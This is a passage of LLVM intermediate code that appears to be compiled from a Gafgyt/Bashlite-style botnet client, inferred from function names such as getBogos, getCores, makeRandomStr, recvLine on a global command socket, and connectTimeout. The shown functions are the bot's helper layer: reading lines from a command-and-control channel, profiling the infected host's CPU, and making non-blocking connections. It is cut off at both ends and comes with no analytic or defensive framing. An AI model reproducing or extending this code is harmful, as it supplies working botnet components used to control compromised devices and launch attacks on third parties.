  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !19

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i64 @parseHex(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !20

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @wildString(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getHost(i8* %0, %struct.in_addr* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @uppercase(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !21

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getBogos(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

13:                                               ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0)) #11
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

19:                                               ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

22:                                               ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

27:                                               ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

37:                                               ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

39:                                               ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22, !llvm.loop !22

42:                                               ; preds = %37
  br label %43

43:                                               ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #11
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

52:                                               ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #11
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

61:                                               ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

63:                                               ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #11
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43, !llvm.loop !23

69:                                               ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #11
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #11
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #12
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

82:                                               ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 4096, i1 false)
  br label %8, !llvm.loop !24

84:                                               ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

87:                                               ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8*, i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

5:                                                ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

10:                                               ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0)) #11
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

19:                                               ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 4096, i1 false)
  br label %5, !llvm.loop !25

21:                                               ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeRandomStr(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !26

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @recvLine(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.fd_set*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.fd_set*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.fd_set* %8, %struct.fd_set** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.fd_set*, %struct.fd_set** %11, align 8
  %31 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !27

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.fd_set* %8, %struct.fd_set** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.fd_set*, %struct.fd_set** %15, align 8
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !28

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !29

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 %107, i8* %16, i64 1, i32 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %128

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !30

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i8*, i8** %17, align 8
  %126 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* %125)
  %127 = load i32, i32* %18, align 4
  store i32 %127, i32* %4, align 4
  br label %128

128:                                              ; preds = %123, %110
  %129 = load i32, i32* %4, align 4
  ret i32 %129
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connectTimeout(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #15
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #15
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !31

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 %86, i32 1, i32 4, i8* %87, i32* %13) #12
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
